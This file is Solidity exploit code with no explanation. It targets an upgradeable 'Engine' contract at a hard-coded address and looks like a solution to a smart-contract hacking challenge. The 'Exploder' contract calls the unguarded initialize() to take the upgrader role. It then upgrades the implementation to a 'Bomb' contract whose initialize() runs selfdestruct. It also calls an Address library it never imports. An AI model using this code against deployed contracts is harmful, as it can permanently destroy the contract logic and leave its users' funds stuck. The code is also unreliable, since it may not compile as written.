
pragma solidity 0.7.0;
import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.4/contracts/proxy/Initializable.sol';

contract Engine is Initializable {
    
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
address public upgrader;
    uint256 public horsePower;
struct AddressSlot {
        address value;
    }
function initialize() external initializer {
        horsePower = 1000;
        upgrader = msg.sender;
    }

    
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable {
        _authorizeUpgrade();
        _upgradeToAndCall(newImplementation, data);
    }

    function _authorizeUpgrade() internal view {
        require(msg.sender == upgrader, "Can't upgrade");
    }

    function _upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) internal {
        
        _setImplementation(newImplementation);
        if (data.length > 0) {
            (bool success,) = newImplementation.delegatecall(data);
            require(success, "Call failed");
        }
    }
    
    
    function _setImplementation(address newImplementation) private {
        require(Address.isContract(newImplementation), "ERC1967: new implementation is not a contract");
        
        AddressSlot storage r;
        assembly {
            r.slot := _IMPLEMENTATION_SLOT
        }
        r.value = newImplementation;
    }
}
contract Exploder {
     Engine public originalContract = Engine(0x7931Bbf577f711e015200dffe10498B409bdb156);
     event logEvent(bool, bytes);
     
   function attackEngine() external  {
       (bool success, bytes memory data) = address(originalContract).call{gas:7000}(abi.encodeWithSignature('initialize()'));
       emit logEvent(success, data);
    }
    
    function destroyWithBomb() external {
        
        Bomb bomb = new Bomb();
        
       (bool success, bytes memory data) =  address(originalContract).call{gas:7000}(abi.encodeWithSignature('upgradeToAndCall(address,bytes)',address(bomb), abi.encodeWithSignature("initialize()")));
emit logEvent(success, data);
    }
}
contract Bomb {
function initialize() external {
        selfdestruct(msg.sender);
    }
}
